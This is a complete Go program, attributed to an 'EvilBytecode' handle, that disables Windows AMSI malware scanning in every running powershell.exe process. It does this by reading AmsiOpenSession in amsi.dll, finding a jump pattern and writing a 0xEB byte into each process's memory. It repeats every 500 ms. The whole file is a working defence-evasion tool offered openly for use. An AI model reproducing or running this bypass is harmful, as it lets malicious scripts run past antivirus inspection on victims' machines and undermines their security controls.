package main

import (
 "fmt"
 "syscall"
 "time"
 "unsafe"
 "golang.org/x/sys/windows"
)
// https://github.com/EvilBytecode / codepulze on discord / telegram
const (
 vmoperation    = 0x0008
 vmread         = 0x0010
 vmwrite        = 0x0020
 th32snapproc   = 0x2
 ptchdrq = 500 
)

var patch = []byte{0xEB}

func SPatt(startaddr []byte, pattern []byte) int {
 patsiz := len(pattern)
 for i := 0; i < len(startaddr); i++ {
  if startaddr[i] == pattern[0] {
   j := 1
   for j < patsiz && (pattern[j] == '?' || startaddr[i+j] == pattern[j]) {
    j++
   }
   if j == patsiz {
    return i + 3
   }
  }
 }
 return -1
}

func patchAmsi(tpid uint32) int {
 pattern := []byte{0x48, '?', '?', 0x74, '?', 0x48, '?', '?', 0x74}
 prochandl, _ := windows.OpenProcess(vmoperation|vmread|vmwrite, false, tpid)
 defer windows.CloseHandle(prochandl)
 hm, _ := windows.LoadLibrary("amsi.dll")
 defer windows.FreeLibrary(hm)
 AmsiAddr, _ := windows.GetProcAddress(hm, "AmsiOpenSession")
 buff := make([]byte, 1024)
 var bytereadt uintptr
 _ = windows.ReadProcessMemory(prochandl, uintptr(AmsiAddr), &buff[0], 1024, &bytereadt)
 matchaddr := SPatt(buff, pattern)
 if matchaddr == -1 {
  return 144
 }
 fmt.Printf("amsi addr %X\n", AmsiAddr)
 fmt.Printf("offset : %d\n", matchaddr)
 updaamsaddr := uintptr(AmsiAddr) + uintptr(matchaddr)
 var bytwrite uintptr
 _ = windows.WriteProcessMemory(prochandl, updaamsaddr, &patch[0], 1, &bytwrite)
 return 0
}

func PatchAllPowershells(pn string) {
 hSnap, _ := windows.CreateToolhelp32Snapshot(th32snapproc, 0)
 defer windows.CloseHandle(hSnap)
 var pE windows.ProcessEntry32
 pE.Size = uint32(unsafe.Sizeof(pE))
 windows.Process32First(hSnap, &pE)
 for {
  if pE.ExeFile[0] == 0 {
   break
  }
  if syscall.UTF16ToString(pE.ExeFile[:]) == pn {
   procId := pE.ProcessID
   result := patchAmsi(procId)
   switch result {
   case 0:
    fmt.Printf("AMSI patched %d\n", pE.ProcessID)
   case 144:
    fmt.Println("Already patched in this current console..")
   default:
    fmt.Println("Patch failed")
   }
  }
  if windows.Process32Next(hSnap, &pE) != nil {
   break
  }
 }
}

func main() {
 for {
  PatchAllPowershells("powershell.exe")
  time.Sleep(ptchdrq * time.Millisecond)
 }
}